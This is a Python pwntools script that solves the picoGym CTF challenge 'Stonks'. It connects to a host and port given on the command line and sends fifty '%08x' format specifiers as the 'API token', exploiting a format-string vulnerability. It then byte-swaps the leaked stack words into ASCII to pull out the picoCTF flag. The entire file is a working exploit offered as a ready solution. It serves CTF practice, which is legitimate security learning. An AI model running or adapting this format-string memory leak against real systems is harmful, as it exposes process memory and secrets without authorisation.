#!/usr/bin/python3

import argparse
import typing
import sys


class Exploit:
  """ Exploit class """

  def __init__(self, cmd_args: typing.List[str])->None:
    """ Argument checker
    
    : param cmd_args : List - List of arguments suppplied

    Validates the arguments.
    Throws an exception if the validation fails.
    """
    self.__parser = argparse.ArgumentParser(
      description = "Picogym CTF - Stonks"
    )

    self.__parser.add_argument("-t", "--RHOST",
                              type = str,
                              help = "Target host",
                              required = True) # host

    self.__parser.add_argument("-p", "--PORT",
                              type = int,
                              help = "Host port",
                              required = True) # port

    self.__args = self.__parser.parse_args(cmd_args)


  def run(self)->None:
    """ Main body of the exploit
    """
    import pwn

    conn = pwn.remote(self.__args.RHOST, self.__args.PORT)
    conn.recvuntil(b'View my portfolio')
    conn.send(b'1\n')
    conn.recvuntil(b'What is your API token?')
    conn.send(b'0x%08x' * 50 + b'\n')
    conn.recvuntil(b'Buying stonks with token:\n')
    stack_data = conn.recvline()

    """ swap endiann and decode to ASCII"""
    flag = ""
    for x86_data in stack_data.decode("utf-8").split("0x")[1:]:
      for i in range(-1, -8, -2):
        stack_data_swap_endian = ""
        stack_data_swap_endian += x86_data[i-1]
        stack_data_swap_endian += x86_data[i]
        _ascii = int(stack_data_swap_endian, 16)
        if (_ascii > 32) and (_ascii < 127):
          flag += chr(_ascii)

    print(flag[flag.find("picoCTF{"):flag.find("}")+1])


def main(cmd_args: typing.List[str])->None:
  """ Get command line parameters

  : param cmd_args : List - List of arguments suppplied
  
  Binds the command line arguments to the Exploit class constructor$
  """
  script = Exploit(cmd_args)
  script.run()


if __name__ == "__main__":
  main(sys.argv[1:])
